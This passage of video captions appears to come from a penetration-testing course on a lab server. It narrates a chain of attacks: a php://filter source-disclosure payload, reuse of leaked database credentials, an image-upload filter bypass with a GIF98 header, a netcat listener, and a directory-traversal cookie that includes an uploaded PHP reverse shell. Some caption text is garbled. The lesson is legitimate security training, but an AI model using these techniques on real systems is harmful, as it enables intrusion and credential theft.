gonna look at all of them.\n\n256\n00:13:53.660 --> 00:13:57.046\nThere was the index, and\nwe saw that in net co here.\n\n257\n00:13:57.046 --> 00:14:04.797\nWe see login.php, I think there is\nan index as well if I wasn't mistaken.\n\n258\n00:14:04.797 --> 00:14:09.925\nThere usually is anyway even\nif it's not showing up here,\n\n259\n00:14:09.925 --> 00:14:12.866\nimages is a directory not a page.\n\n260\n00:14:12.866 --> 00:14:16.490\nSo anyway I'm pretty sure\nthere's index.php as well.\n\n261\n00:14:16.490 --> 00:14:17.960\nSo let's go back here.\n\n262\n00:14:17.960 --> 00:14:21.343\nI need my prompt, actually.\n\n263\n00:14:21.343 --> 00:14:22.840\nOther prompt, please.\n\n264\n00:14:22.840 --> 00:14:25.428\nThere we go.\n\n265\n00:14:25.428 --> 00:14:29.559\nSo what we need to do is,\nit is, I was gonna use curl, but\n\n266\n00:14:29.559 --> 00:14:32.078\nI'm just gonna use the web browser.\n\n267\n00:14:32.078 --> 00:14:34.798\nI don't need to view source,\nI'm gonna just kind of wipe this out.\n\n268\n00:14:34.798 --> 00:14:41.052\nAnd what I'm gonna do is I'm gonna\nsay http:// whatever the site is,\n\n269\n00:14:41.052 --> 00:14:45.667\n.168.219.145 and then I'm gonna say,\n\n270\n00:14:45.667 --> 00:14:49.254\npage equals just like what we saw before,\n\n271\n00:14:49.254 --> 00:14:53.378\nbut this time we're gonna\nadd that PHP filter.\n\n272\n00:14:53.378 --> 00:14:59.090\nSo php://filter just like that.\n\n273\n00:14:59.090 --> 00:15:03.634\nWe're going to say,\n\n274\n00:15:03.634 --> 00:15:13.634\nconvert.base64-endcode/resource=index.\n\n275\n00:15:15.003 --> 00:15:20.348\nSo there was an index.php,\nthere was a config.php.\n\n276\n00:15:20.348 --> 00:15:22.680\nLet's do that one first, right?\n\n277\n00:15:22.680 --> 00:15:25.049\nWell, let's just do this one,\nsee what comes up.\n\n278\n00:15:25.049 --> 00:15:27.836\nHoly cow, now we get a little interesting.\n\n279\n00:15:27.836 --> 00:15:30.907\nSo this is that base64\nencoded information that we\n\n280\n00:15:30.907 --> 00:15:33.849\ndidn't see normally when\nwe did a right-click.\n\n281\n00:15:33.849 --> 00:15:35.950\nAnd so\nit just kinda gave us the source code.\n\n282\n00:15:35.950 --> 00:15:39.910\nSo if we were doing index,\nlet me show you that.\n\n283\n00:15:39.910 --> 00:15:45.785\n192.196.802.145/index.php and\n\n284\n00:15:45.785 --> 00:15:51.010\nwe did a right click on\nthis in View Page Source.\n\n285\n00:15:52.030 --> 00:15:56.130\nThat's all we get, we don't see that so\nthere's some hidden data there.\n\n286\n00:15:56.130 --> 00:15:59.572\nWe found that using that\nbase 64 encoding process.\n\n287\n00:15:59.572 --> 00:16:03.290\nSo there it is,\nnow we have to do is decoding Easy, right?\n\n288\n00:16:03.290 --> 00:16:05.073\n&gt;&gt; Yeah, [LAUGH], nothing to it, right?\n\n289\n00:16:05.073 --> 00:16:07.553\nJust slip a little Python.\n\n290\n00:16:07.553 --> 00:16:09.712\nActually it is not that difficult.\n\n291\n00:16:09.712 --> 00:16:13.083\nI'm gonna show you a very cool method for\ndoing this here.\n\n292\n00:16:13.083 --> 00:16:15.352\nThere's a couple ways actually,\nand they're all really cool.\n\n293\n00:16:15.352 --> 00:16:20.320\nSo I'm just gonna copy that string,\nand then first, the easy way.\n\n294\n00:16:20.320 --> 00:16:24.590\nYou see this little browser\nbar I have installed here?\n\n295\n00:16:24.590 --> 00:16:26.487\nThat's HackBar.\n\n296\n00:16:26.487 --> 00:16:29.517\nSo run out, grab HackBar,\ninstall it on your machine.\n\n297\n00:16:29.517 --> 00:16:32.313\nIt's got great tools in it, great tools.\n\n298\n00:16:32.313 --> 00:16:33.280\nIt's a fantastic thing.\n\n299\n00:16:34.780 --> 00:16:36.870\nI'm gonna go to this encryption area.\n\n300\n00:16:36.870 --> 00:16:38.246\nI'm sorry, encoding.\n\n301\n00:16:38.246 --> 00:16:40.526\nI'm gonna say base 64 decode.\n\n302\n00:16:40.526 --> 00:16:43.323\nIt's gonna ask me what was the string\nthat I would like to decode.\n\n303\n00:16:43.323 --> 00:16:45.038\nCopy and paste.\n\n304\n00:16:45.038 --> 00:16:53.102\nHit OK, and\nthere is the decoded base 64 information.\n\n305\n00:16:53.102 --> 00:16:57.753\nSo we're getting information out of here,\na lot of good information.\n\n306\n00:16:57.753 --> 00:17:01.230\nI'm actually seeing some information\nthat I like right here at the top.\n\n307\n00:17:01.230 --> 00:17:02.716\nI like this.\n\n308\n00:17:02.716 --> 00:17:06.224\nYou see the set cookie, LAN, PM, LAN php.\n\n309\n00:17:06.224 --> 00:17:11.534\nIt this set cookie lan,\nlet me have the lan here.\n\n310\n00:17:11.534 --> 00:17:14.462\nThis whole block of code.\n\n311\n00:17:14.462 --> 00:17:15.445\nMike, I don't know if you can see that.\n\n312\n00:17:15.445 --> 00:17:16.747\nWhat does that say right there?\n\n313\n00:17:16.747 --> 00:17:18.535\n&gt;&gt; That looks like like the word include.\n\n314\n00:17:18.535 --> 00:17:20.277\n&gt;&gt; Yeah, it does, doesn't it?\n\n315\n00:17:20.277 --> 00:17:25.358\n&gt;&gt; It's including a cookie\nvalue of some sort right here.\n\n316\n00:17:25.358 --> 00:17:27.790\nThat's definitely, that's good stuff.\n\n317\n00:17:27.790 --> 00:17:30.660\nThat means we might have\nLFI through that means.\n\n318\n00:17:30.660 --> 00:17:34.340\nSo we couldn't do it before through\nthe browser URL, maybe we can go through\n\n319\n00:17:34.340 --> 00:17:39.020\nthe backdoor here, and use this\ninclude that we have available to us.\n\n320\n00:17:39.020 --> 00:17:41.928\nSo we'll keep that on the back burner for\nright this second.\n\n321\n00:17:41.928 --> 00:17:43.180\nI wanna show you something else.\n\n322\n00:17:43.180 --> 00:17:46.030\nCuz remember, that config.php is set,\nthere might be usernames and\n\n323\n00:17:46.030 --> 00:17:47.380\npasswords in there.\n\n324\n00:17:47.380 --> 00:17:50.077\nYou think if we ran this in code thing-\n&gt;&gt; Let's try it.\n\n325\n00:17:50.077 --> 00:17:52.010\n&gt;&gt; That we might find\nsomething interesting?\n\n326\n00:17:53.190 --> 00:17:55.727\nLet's try config.\n\n327\n00:17:55.727 --> 00:17:58.120\nHey, there's another string of data.\n\n328\n00:17:58.120 --> 00:18:00.575\nLet's copy that.\n\n329\n00:18:00.575 --> 00:18:02.640\nCopy, let's run it through.\n\n330\n00:18:02.640 --> 00:18:04.440\nI'll show you a different way\nto decode this thing, right?\n\n331\n00:18:04.440 --> 00:18:07.469\nWe'll bring up our terminal and\nyou can do it like this.\n\n332\n00:18:07.469 --> 00:18:13.376\nYou can say echo and then paste that in,\n\n333\n00:18:13.376 --> 00:18:20.367\nand then type that into base 64 --decode.\n\n334\n00:18:22.830 --> 00:18:24.359\nHey, what's that, Mike?\n\n335\n00:18:24.359 --> 00:18:26.712\n&gt;&gt; Those [LAUGH] look like usernames and\npasswords to me.\n\n336\n00:18:26.712 --> 00:18:28.142\n&gt;&gt; [LAUGH] Yes, it does, doesn't it?\n\n337\n00:18:28.142 --> 00:18:29.480\n&gt;&gt; I believe Nitko was correct.\n\n338\n00:18:29.480 --> 00:18:33.010\n&gt;&gt; You know, unlike one\nSamuel L Jackson in Jurassic Park,\n\n339\n00:18:33.010 --> 00:18:35.121\nI love this hacker's crap.\n\n340\n00:18:35.121 --> 00:18:36.169\n[LAUGH] This is fun.\n\n341\n00:18:36.169 --> 00:18:37.021\nIt is a good time.\n\n342\n00:18:37.021 --> 00:18:38.360\nLook at that there.\n\n343\n00:18:38.360 --> 00:18:41.440\nSo I've got a server,\nI've got a user name, route,\n\n344\n00:18:41.440 --> 00:18:44.020\nand a password, right then and there.\n\n345\n00:18:44.020 --> 00:18:45.470\nWell, that is an interesting thing.\n\n346\n00:18:47.170 --> 00:18:49.250\nHey, I remember when we\nwere running our Nmap scan.\n\n347\n00:18:49.250 --> 00:18:52.555\nWasn't there a SQL Server\nremote port open?\n\n348\n00:18:52.555 --> 00:18:53.458\n&gt;&gt; There was.\n\n349\n00:18:53.458 --> 00:18:56.570\n&gt;&gt; [LAUGH] Let's see if we can't log\ninto that using these credentials.\n\n350\n00:18:56.570 --> 00:18:58.092\nI wonder if that'll work.\n\n351\n00:18:58.092 --> 00:19:00.700\nLet's get our little thing going here.\n\n352\n00:19:02.580 --> 00:19:08.840\nAnd we will say, let me get, so I can say,\nfollow my notes just perfectly here.\n\n353\n00:19:08.840 --> 00:19:14.686\nSo MySQL, this is how you log in remotely,\n-u root was the name.\n\n354\n00:19:14.686 --> 00:19:17.045\nI wanna say -p so\nit prompts me for a password.\n\n355\n00:19:17.045 --> 00:19:19.212\nI'm not gonna actually put\nthe password in the string.\n\n356\n00:19:19.212 --> 00:19:21.809\nI want it to prompt me for it.\n\n357\n00:19:21.809 --> 00:19:23.495\nThen -h, what's the host?\n\n358\n00:19:23.495 --> 00:19:27.310\n192.168.219.145, and\n\n359\n00:19:27.310 --> 00:19:31.344\nthen hit return, asks me for the password.\n\n360\n00:19:31.344 --> 00:19:36.515\nI will copy and\npaste that monkey right here,\n\n361\n00:19:36.515 --> 00:19:40.090\ncopy, paste, hit return.\n\n362\n00:19:40.090 --> 00:19:41.680\nAnd look at that, it's a MySQL prompt.\n\n363\n00:19:41.680 --> 00:19:45.900\nI am logged into the SQL Server right now,\nas root, by the way.\n\n364\n00:19:45.900 --> 00:19:47.650\nAs root, by the way, just FYI on that one.\n\n365\n00:19:47.650 --> 00:19:49.238\n&gt;&gt; And done,\nforget the local file includes.\n\n366\n00:19:49.238 --> 00:19:53.194\n[LAUGH] I mean, I'm in their database,\nwhat more do I need?\n\n367\n00:19:53.194 --> 00:19:55.800\n&gt;&gt; Yeah, you can definitely have some\nfun at this point in time, right?\n\n368\n00:19:55.800 --> 00:19:57.877\nBut we're going for that web server.\n\n369\n00:19:57.877 --> 00:20:01.170\nWe want real root access,\nnot just access to their database per se.\n\n370\n00:20:01.170 --> 00:20:03.880\n&gt;&gt; Well, Daniel, I remember when\nwe first browsed that website,\n\n371\n00:20:03.880 --> 00:20:06.550\nwe had a couple of links up top,\nUpload was nice.\n\n372\n00:20:06.550 --> 00:20:07.420\nWe had a Homelink.\n\n373\n00:20:07.420 --> 00:20:09.390\nWe also had one that said Login.\n\n374\n00:20:09.390 --> 00:20:10.440\n&gt;&gt; That's correct.\n\n375\n00:20:10.440 --> 00:20:12.140\nI wonder if these login\ncredentials will work there?\n\n376\n00:20:13.240 --> 00:20:14.310\nIt's worth giving it a shot, right?\n\n377\n00:20:14.310 --> 00:20:15.190\nLet's give that a shot.\n\n378\n00:20:16.260 --> 00:20:20.551\nSo let's go to Login, and it was root.\n\n379\n00:20:20.551 --> 00:20:24.579\nI should still have that copied to\nthe clipboard, just Paste that in there.\n\n380\n00:20:24.579 --> 00:20:27.521\nHit Login, [SOUND].\n\n381\n00:20:27.521 --> 00:20:28.302\n&gt;&gt; That would have been too easy, right?\n\n382\n00:20:28.302 --> 00:20:29.901\n&gt;&gt; Yeah,\nthat would have been awesome, right?\n\n383\n00:20:29.901 --> 00:20:31.076\n&gt;&gt; [LAUGH]\n&gt;&gt; But as Nitko said,\n\n384\n00:20:31.076 --> 00:20:34.839\nit said it might have been database\ncredentials, so it was worth a shot,\n\n385\n00:20:34.839 --> 00:20:36.455\ndefinitely try those things.\n\n386\n00:20:36.455 --> 00:20:37.904\nDon't, just because it didn't work here\ndoesn't mean you shouldn't try it.\n\n387\n00:20:37.904 --> 00:20:41.412\n&gt;&gt; Because administrators never use\nthe same password in more than one place.\n\n388\n00:20:41.412 --> 00:20:42.367\n&gt;&gt; No, it never happens.\n&gt;&gt; Never.\n\n389\n00:20:42.367 --> 00:20:43.084\n&gt;&gt; No, no.\n\n390\n00:20:43.084 --> 00:20:45.894\n&gt;&gt; [LAUGH]\n&gt;&gt; Wrong, so it didn't work here, so\n\n391\n00:20:45.894 --> 00:20:47.180\nthat's cool.\n\n392\n00:20:47.180 --> 00:20:48.500\nLet's go back to our database.\n\n393\n00:20:49.950 --> 00:20:53.270\nI will lift this up just a hair for\nyou guys.\n\n394\n00:20:53.270 --> 00:20:56.700\nAnd let's mess around\nwith this thing here.\n\n395\n00:20:56.700 --> 00:21:00.563\nSo let's just show databases.\n\n396\n00:21:00.563 --> 00:21:01.678\nLittle transact SQL.\n\n397\n00:21:01.678 --> 00:21:05.427\nSo we only have two, or we got\nthe information schema, and one database,\n\n398\n00:21:05.427 --> 00:21:06.800\nwhich is users.\n\n399\n00:21:06.800 --> 00:21:09.302\nSo we will use users.\n\n400\n00:21:11.034 --> 00:21:14.542\nSo our database has changed,\nand I'll say show tables.\n\n401\n00:21:14.542 --> 00:21:15.960\nSee the table\u007fs inside of it.\n\n402\n00:21:15.960 --> 00:21:18.500\nGreat only one table there, easy enough.\n\n403\n00:21:18.500 --> 00:21:24.007\nSo we will say select * from users,\n\n404\n00:21:24.007 --> 00:21:28.970\ndon't forget your semicolon.\n\n405\n00:21:28.970 --> 00:21:31.028\nHey, hey, hey, what is this?\n\n406\n00:21:31.028 --> 00:21:33.626\n&gt;&gt; More and more usernames and passwords.\n\n407\n00:21:33.626 --> 00:21:35.774\n&gt;&gt; So this is getting great,\nright, I'm loving this.\n\n408\n00:21:35.774 --> 00:21:37.520\nSo I've got three usernames and passwords.\n\n409\n00:21:37.520 --> 00:21:40.579\nWe can copy that and\npaste that out into a file if we like.\n\n410\n00:21:40.579 --> 00:21:44.392\nI think I've already actually done that,\nbut look at these passwords.\n\n411\n00:21:44.392 --> 00:21:48.144\nYou might wanna know, how did I know about\nlike that string that that was Base64?\n\n412\n00:21:48.144 --> 00:21:51.660\nA, because I encoded it in Base64,\nso I knew to decode there.\n\n413\n00:21:51.660 --> 00:21:56.150\nBut also typically if you see something\nthat looks like it's encoded,\n\n414\n00:21:56.150 --> 00:21:59.940\nyou start to get a feel for these things.\n\n415\n00:21:59.940 --> 00:22:03.580\nThese double equal signs on\nthe end are a telltale sign\n\n416\n00:22:03.580 --> 00:22:07.120\nthat this is a Base64 encoded string.\n\n417\n00:22:07.120 --> 00:22:10.421\nSo we have passwords but\nthey're encoded in Base64.\n\n418\n00:22:10.421 --> 00:22:13.030\nWe've got a list of usernames,\nthat's great, that's not encoded.\n\n419\n00:22:13.030 --> 00:22:17.610\nSo now we just have to run these guys\nback through our processor here and\n\n420\n00:22:17.610 --> 00:22:20.970\ndecode these things,\nwhich was easy enough done.\n\n421\n00:22:20.970 --> 00:22:23.330\nLet me make sure I actually\ncopied that stuff.\n\n422\n00:22:23.330 --> 00:22:25.925\nI'm pretty sure I did in here.\n\n423\n00:22:25.925 --> 00:22:27.220\nLet me see here.\n\n424\n00:22:27.220 --> 00:22:28.120\nYeah, there it is.\n\n425\n00:22:28.120 --> 00:22:31.620\nCat, MySQL users, and there it was.\n\n426\n00:22:31.620 --> 00:22:34.020\nSo I've already actually done\nthe process of decoding them.\n\n427\n00:22:34.020 --> 00:22:36.480\nWe saw that using the Pipebase 64.\n\n428\n00:22:36.480 --> 00:22:38.830\nLet me show you how to do it with Python.\n\n429\n00:22:38.830 --> 00:22:43.452\nJust so you have another, another way\nto do this, another way to do this,\n\n430\n00:22:43.452 --> 00:22:44.508\nreally simple.\n\n431\n00:22:44.508 --> 00:22:47.640\nMove this back out of the way,\nI don't wanna, yeah, there it is.\n\n432\n00:22:47.640 --> 00:22:50.716\nI can't, I'm horrible about\nremembering my Python commands.\n\n433\n00:22:50.716 --> 00:22:57.328\nSo let me exit out,\nI'll say python -m base64 and\n\n434\n00:22:57.328 --> 00:23:04.089\nthen -d for decode, and\nthen three less than signs,\n\n435\n00:23:04.089 --> 00:23:08.461\na space and whatever the value is.\n\n436\n00:23:08.461 --> 00:23:13.753\nSo I need to come over here and\njust copy the value,\n\n437\n00:23:13.753 --> 00:23:17.660\npaste it into there and there you go.\n\n438\n00:23:19.630 --> 00:23:20.660\nThere's the string.\n\n439\n00:23:20.660 --> 00:23:23.518\nAnd as you can see,\nthat's what I got right there.\n\n440\n00:23:23.518 --> 00:23:27.870\nSo I just did all three of those, so now I\nhave the actual user names and passwords.\n\n441\n00:23:27.870 --> 00:23:31.290\nNow it is a bunch of jumbled mess, so\nyou might think maybe it's double encoded.\n\n442\n00:23:31.290 --> 00:23:34.439\nMaybe that's a MD5 hash or\nsome other hashing.\n\n443\n00:23:34.439 --> 00:23:38.160\nYou can try to run it through a different\nhashing or you can just try those.\n\n444\n00:23:38.160 --> 00:23:44.379\nFirst, do the easy things first before you\ntrudge along to something more difficult.\n\n445\n00:23:44.379 --> 00:23:47.756\nTry the easy thing first,\ncuz it's always the easy thing first.\n\n446\n00:23:47.756 --> 00:23:51.378\nYou just don't wanna spend hours at a time\ndoing something hard just to realize,\n\n447\n00:23:51.378 --> 00:23:53.590\nI could have just logged in with this.\n\n448\n00:23:53.590 --> 00:23:57.307\nSo let's try that, we've got Kent,\nMike and Cane, different passwords.\n\n449\n00:23:57.307 --> 00:24:02.365\nOpen up our browser,\ngo to the log in area My name is Kent.\n\n450\n00:24:02.365 --> 00:24:05.713\nMy password is,\n\n451\n00:24:05.713 --> 00:24:10.740\ncopy that, paste it in.\n\n452\n00:24:10.740 --> 00:24:14.290\nLog in, ho, ho, ho,\nwe are logged in the system.\n\n453\n00:24:14.290 --> 00:24:17.180\nThat is a gravy train right\nthere if I ever saw it.\n\n454\n00:24:17.180 --> 00:24:18.001\nI'm going to close this.\n\n455\n00:24:18.001 --> 00:24:20.880\nI'm going to be sure and remember this,\nbut now, what do I have the option to do?\n\n456\n00:24:20.880 --> 00:24:23.760\nI have the option to\nupload a file basically\n\n457\n00:24:23.760 --> 00:24:26.360\nis where it took me cuz you can see\nright here, now the page=upload.\n\n458\n00:24:26.360 --> 00:24:31.060\nIt redirected me to the upload page\nas soon as I logged in, very good.\n\n459\n00:24:31.060 --> 00:24:36.410\nHey, I have a really cool thing\nthat we had from our RFI A PHP\n\n460\n00:24:36.410 --> 00:24:39.710\nreverse shell, and\nI'm gonna upload that file right now.\n\n461\n00:24:39.710 --> 00:24:43.770\nAll right, so let's browse to that.\n\n462\n00:24:43.770 --> 00:24:45.650\nThere it is,\nI don't know what firm number.\n\n463\n00:24:45.650 --> 00:24:48.330\nThat's why I wrote these things down,\nso right out of the shell.\n\n464\n00:24:48.330 --> 00:24:50.710\nYeah, Shell, not Shell2.\n\n465\n00:24:50.710 --> 00:24:52.622\nI must have been playing\naround different stuff.\n\n466\n00:24:52.622 --> 00:24:58.578\nOpen that and I hit Upload,\nand there it is.\n\n467\n00:24:58.578 --> 00:25:02.205\nNow that would work, I cannot jump over.\n\n468\n00:25:02.205 --> 00:25:04.913\nLet me go back,\nlet me show you something really quickly.\n\n469\n00:25:04.913 --> 00:25:09.216\nLet me try this path.\n\n470\n00:25:09.216 --> 00:25:12.434\nHere we go, php.vershell.php,\n\n471\n00:25:12.434 --> 00:25:17.490\nthe actual shell file,\nlet me open that and hit Upload.\n\n472\n00:25:17.490 --> 00:25:22.071\nIt knows that not allowed extension,\nplease upload images only.\n\n473\n00:25:22.071 --> 00:25:26.524\nSo, my PHP reverse shell as\nit were is not gonna upload.\n\n474\n00:25:26.524 --> 00:25:29.140\nThat's why I had that shell.gif,\nyou'll notice it was a .gif.\n\n475\n00:25:29.140 --> 00:25:31.220\nLet me show you what I did there.\n\n476\n00:25:31.220 --> 00:25:33.920\nA little Tarantinoing for\nyou, kinda jumped ahead.\n\n477\n00:25:33.920 --> 00:25:35.709\nWe're gonna go back and\nsee how that worked.\n\n478\n00:25:36.920 --> 00:25:44.430\nWhat I did was is if I look in here ls,\nthere's php-reverse-shell right there so\n\n479\n00:25:44.430 --> 00:25:49.470\nI just copied it and called it shell.gif\nand Linux can do that kind of thing,\n\n480\n00:25:49.470 --> 00:25:54.908\nyou can do that on Windows too but\nif I just say copy php-reverse-shell dot.\n\n481\n00:25:54.908 --> 00:25:58.880\nPHP to shell.gif it doesn't care that\n\n482\n00:25:58.880 --> 00:26:03.604\nit's called .gif what I did\nhave to do was is if I,\n\n483\n00:26:03.604 --> 00:26:08.791\nwe had shell.gif,\n\n484\n00:26:08.791 --> 00:26:11.910\nthere we go.\n\n485\n00:26:11.910 --> 00:26:13.230\nSee this right here?\n\n486\n00:26:13.230 --> 00:26:15.010\nSo this is my PHP.\n\n487\n00:26:15.010 --> 00:26:17.350\nStuff normal every day php code.\n\n488\n00:26:17.350 --> 00:26:21.460\nBut the very first line,\nI had to add this gif 98,\n\n489\n00:26:21.460 --> 00:26:26.270\nand that basically fools the system\ninto believing this is a gif.\n\n490\n00:26:26.270 --> 00:26:28.520\nBy just adding that line to there.\n\n491\n00:26:28.520 --> 00:26:31.330\nSo I was met with a little\nbit of sanitation.\n\n492\n00:26:31.330 --> 00:26:34.260\nIt says you can only\nupload image type files.\n\n493\n00:26:34.260 --> 00:26:38.080\nJpegs and things of that nature\nWith a to create a GIF super easy.\n\n494\n00:26:38.080 --> 00:26:40.580\nAdd gif 98 to the very first line.\n\n495\n00:26:40.580 --> 00:26:43.520\n&gt;&gt; Just changing the extension wouldn't be\nenough cuz it's gonna look at that first\n\n496\n00:26:43.520 --> 00:26:46.100\nline and go, wait this is isn't a GIF,\nI can't, this isn't an image.\n\n497\n00:26:46.100 --> 00:26:47.880\n&gt;&gt; Exactly.\n&gt;&gt; But adding that line tricks it.\n\n498\n00:26:47.880 --> 00:26:48.500\n&gt;&gt; You nailed it.\n\n499\n00:26:48.500 --> 00:26:49.840\nMike gold star yet again.\n\n500\n00:26:49.840 --> 00:26:52.370\nHe's our star pupil here.\n\n501\n00:26:52.370 --> 00:26:53.900\nSo that's gonna help us now.\n\n502\n00:26:53.900 --> 00:26:57.950\nWe can upload our file which we\nare ready to do So, we chose that.\n\n503\n00:26:57.950 --> 00:27:00.900\nLet's go back to, let's just do that.\n\n504\n00:27:00.900 --> 00:27:06.270\nBrowse, upload shell gif,\nopen and hit upload.\n\n505\n00:27:06.270 --> 00:27:09.910\nSo, now what we need to do is find out\nwhere the heck did that file get saved.\n\n506\n00:27:09.910 --> 00:27:12.260\nCool thing is,\nthat's a pretty easy process.\n\n507\n00:27:12.260 --> 00:27:17.485\nThere's a broken little gif Icon concerns,\nthere's no picture data here.\n\n508\n00:27:17.485 --> 00:27:18.990\n&gt;&gt; [LAUGH]\n&gt;&gt; I don't know you say it's\n\n509\n00:27:18.990 --> 00:27:21.490\na GIF I guess it's a GIF but\nthere's nothing there for me to display so\n\n510\n00:27:21.490 --> 00:27:26.880\nI'll just put the little broken GIF thing,\njust right click and view or\n\n511\n00:27:26.880 --> 00:27:31.930\ncopy, where is it yeah, view image.\n\n512\n00:27:31.930 --> 00:27:35.730\nAnd the image and look at that,\nthere is the actual.\n\n513\n00:27:35.730 --> 00:27:37.730\nURL to that.\n\n514\n00:27:37.730 --> 00:27:39.840\nThis is, cannot be displayed\nbecause it contains errors.\n\n515\n00:27:39.840 --> 00:27:40.510\nThat's fine.\n\n516\n00:27:40.510 --> 00:27:41.400\nI don't care.\n\n517\n00:27:41.400 --> 00:27:43.900\nAll I want to know is,\nwhere the heck is that thing?\n\n518\n00:27:43.900 --> 00:27:47.970\nIt's in upload and this is the file name,\ndot gift that it saved it in.\n\n519\n00:27:47.970 --> 00:27:51.240\nI'm just going to save\nthat upload portion.\n\n520\n00:27:51.240 --> 00:27:52.640\nNo, I'm not.\n\n521\n00:27:52.640 --> 00:27:55.050\nIf I can.\nIt's not allowing me.\n\n522\n00:27:55.050 --> 00:27:55.800\nSo, great for you.\n\n523\n00:27:55.800 --> 00:27:57.340\nI can do it with curl or\nsomething like that.\n\n524\n00:27:57.340 --> 00:27:57.970\nI was just.\n\n525\n00:27:57.970 --> 00:28:00.005\nJust get that, just copy it with your.\n\n526\n00:28:00.005 --> 00:28:05.140\n[LAUGH] How about I copy\nit out of the actual URL?\n\n527\n00:28:05.140 --> 00:28:06.670\nThat could be easy.\n\n528\n00:28:06.670 --> 00:28:07.780\nCopy that.\n\n529\n00:28:07.780 --> 00:28:08.705\nCopy that, ghost leader.\n\n530\n00:28:08.705 --> 00:28:09.560\n&gt;&gt; [LAUGH]\n&gt;&gt; Now we're off.\n\n531\n00:28:09.560 --> 00:28:11.060\nI actually now have that.\n\n532\n00:28:11.060 --> 00:28:13.980\nSo, now we're gonna go back to,\nremember when we looked at index and\n\n533\n00:28:13.980 --> 00:28:15.870\nthere was that include?\n\n534\n00:28:15.870 --> 00:28:18.430\nMaybe I can include this file,\ncuz that's what we're doing.\n\n535\n00:28:18.430 --> 00:28:21.020\nI want you to include a local file.\n\n536\n00:28:21.020 --> 00:28:21.690\nGuess what?\n\n537\n00:28:21.690 --> 00:28:24.980\nOur php.gif thing is now\na local file on machine, and\n\n538\n00:28:24.980 --> 00:28:27.530\nwe have the exact place that it saved.\n\n539\n00:28:27.530 --> 00:28:32.330\nIt's going to be in\nthe web root/uploads/this\n\n540\n00:28:32.330 --> 00:28:34.460\ngif crazy name that it gives it.\n\n541\n00:28:34.460 --> 00:28:37.920\nSo let's try to Manipulate that dat so\nthat we can do that.\n\n542\n00:28:38.980 --> 00:28:41.930\nAll right lets before we do that\nyou know we gonna we have to make\n\n543\n00:28:41.930 --> 00:28:45.100\nsure we gonna file for a list because\nwere close to make it this happen.\n\n544\n00:28:45.100 --> 00:28:50.780\nLet me get a list a rockin bucken here so\nMC-MVLP9999 because\n\n545\n00:28:50.780 --> 00:28:56.860\nyou know I love it there\nlistening its waiting.\n\n546\n00:28:56.860 --> 00:28:58.110\nIt's all good gravy here.\n\n547\n00:28:59.220 --> 00:29:01.890\nAnd now we need to use our\ngood old friend tamperdata.\n\n548\n00:29:01.890 --> 00:29:03.570\nRemember tamperdata?\n\n549\n00:29:03.570 --> 00:29:07.320\nWe're following the same\ntype of procedure here.\n\n550\n00:29:07.320 --> 00:29:10.400\nSo let's go here, open tamperdata,\n\n551\n00:29:10.400 --> 00:29:16.760\ntools, tamperdata started\nup Start tempering.\n\n552\n00:29:16.760 --> 00:29:17.400\nThank you very much.\n\n553\n00:29:18.860 --> 00:29:22.800\nAnd what we want to do is we want\nto go to that index up here because\n\n554\n00:29:22.800 --> 00:29:23.700\nthat includes was.\n\n555\n00:29:23.700 --> 00:29:26.250\nSo I got to shrink this down.\n\n556\n00:29:26.250 --> 00:29:32.640\nI will go to, I will just this\nthis view source, click enter.\n\n557\n00:29:32.640 --> 00:29:36.030\nAnd yes we do want to tamper with this.\n\n558\n00:29:36.030 --> 00:29:40.810\nAnd look there, there's our cookie,\nPHP session id = yada, yada,\n\n559\n00:29:40.810 --> 00:29:42.840\nyada, but we're not gonna do that.\n\n560\n00:29:42.840 --> 00:29:45.960\nWe're gonna say,\nwe're going to take that out.\n\n561\n00:29:45.960 --> 00:29:50.840\nWe're going to say LAN =, cuz remember\nthat was that language parameter.\n\n562\n00:29:50.840 --> 00:29:53.000\nThat was looking for\nthat local file, right.\n\n563\n00:29:54.470 --> 00:29:57.625\nAnd then I'm just going to do some\ndirectory traversal, just to make sure.\n\n564\n00:29:57.625 --> 00:30:01.810\n../../../../../.\n\n565\n00:30:01.810 --> 00:30:05.630\nAnd I think if I remember,\nthis was an Apache server.\n\n566\n00:30:05.630 --> 00:30:10.350\nSo this should be And var www.html or\n\n567\n00:30:10.350 --> 00:30:14.530\n/html /uplink that's where it should be.\n\n568\n00:30:14.530 --> 00:30:16.475\nSo /var /www.\n\n569\n00:30:16.475 --> 00:30:20.920\n/html technically you don't\nhave to do this but I want you\n\n570\n00:30:20.920 --> 00:30:25.900\nguys to see if it makes it easier to\nunderstand to give you the entire.\n\n571\n00:30:25.900 --> 00:30:27.900\nA working directory\nthat we need to get to.\n\n572\n00:30:27.900 --> 00:30:30.990\nSo I'm traversing out of\nthe directory that I'm in and\n\n573\n00:30:30.990 --> 00:30:35.770\nthen back down into var.www.html/upload\nand then slash whatever that image was.\n\n574\n00:30:35.770 --> 00:30:41.930\nActually I copied that, so\nI'll just copy and paste it.\n\n575\n00:30:46.790 --> 00:30:47.340\nHere we go.\n\n576\n00:30:47.340 --> 00:30:49.030\nMake sure that everything is good.\n\n577\n00:30:49.030 --> 00:30:52.150\nNo extra double slashes or anything.\n\n578\n00:30:52.150 --> 00:30:56.957\nEverything is looking great Now we\n\n579\n00:30:56.957 --> 00:31:01.710\nclick OK and\nwe shall see if our local file, or\n\n580\n00:31:01.710 --> 00:31:06.560\nlook at that there my good\nfriends is shell And no show.\n\n581\n00:31:06.560 --> 00:31:08.560\nJust welcome to the show everyone.\n\n582\n00:31:08.560 --> 00:31:09.060\n[LAUGH]\n&gt;&gt; [LAUGH]\n\n583\n00:31:09.060 --> 00:31:10.660\n&gt;&gt; It's a wonderful thing.\n\n584\n00:31:10.660 --> 00:31:11.970\nDo a Who am I.\n\n585\n00:31:11.970 --> 00:31:12.920\nNot there.\n\n586\n00:31:12.920 --> 00:31:13.790\nDown here Larry.\n\n587\n00:31:13.790 --> 00:31:15.350\nWho am I.\nAnd again,\n\n588\n00:31:15.350 --> 00:31:19.740\nI am running as the web server\nservice account, but from here again,\n\n589\n00:31:19.740 --> 00:31:22.850\nwe can go with privilege escalation and\nmove on from there.\n\n590\n00:31:22.850 --> 00:31:27.610\nWe do have Remote access, and\nnow we're well on our way to root access.\n\n591\n00:31:27.610 --> 00:31:28.720\n&gt;&gt; Fantastic Daniel.\n\n592\n00:31:28.720 --> 00:31:29.880\nThat was really exciting,\n\n593\n00:31:29.880 --> 00:31:33.210\ngreat look at a couple of different\nthings we really accomplished there.\n\n594\n00:31:33.210 --> 00:31:36.430\nWe were able to do\nthe local file include and\n\n595\n00:31:36.430 --> 00:31:39.730\ngrab that and\nget our Shell access to that web 